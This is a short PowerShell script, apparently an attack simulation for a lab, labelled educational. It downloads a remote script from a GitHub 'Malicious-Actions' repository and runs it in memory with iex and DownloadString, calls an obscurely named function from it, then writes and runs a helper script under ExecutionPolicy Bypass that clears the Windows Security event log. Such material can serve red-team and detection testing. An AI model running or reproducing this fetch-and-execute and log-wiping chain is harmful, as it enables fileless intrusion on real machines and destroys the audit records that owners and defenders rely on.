# Disclaimer: This script is for educational purposes only and must be executed in a secure, isolated lab environment.
# Do not execute it in production or on-premises environments under any circumstances.

# URL pointing to an external script (example URL provided for demonstration purposes)
$url = "https://raw.githubusercontent.com/norsemen-local/Malicious-Actions/refs/heads/main/Case%201%20-%20Fileless%20Attack/inject.ps1"

# Download and execute the external script
iex ((New-Object net.webclient).DownloadString($url))
Invoke-HGFXNPCQTZ

# Content for delete_logs.ps1
$deleteLogsContent = @'
# This script is for educational purposes only.
# It clears security logs from the Windows Event Viewer.

try {
    Clear-EventLog -LogName Security
    Write-Output "Security logs have been cleared."
} catch {
    Write-Output "Failed to clear security logs. Ensure you have the required permissions."
}
'@

# Create the delete_logs.ps1 file
$deleteLogsFilePath = "delete_logs.ps1"
Set-Content -Path $deleteLogsFilePath -Value $deleteLogsContent

# Execute the newly created delete_logs.ps1 script
Write-Output "Executing delete_logs.ps1..."
PowerShell -ExecutionPolicy Bypass -File $deleteLogsFilePath
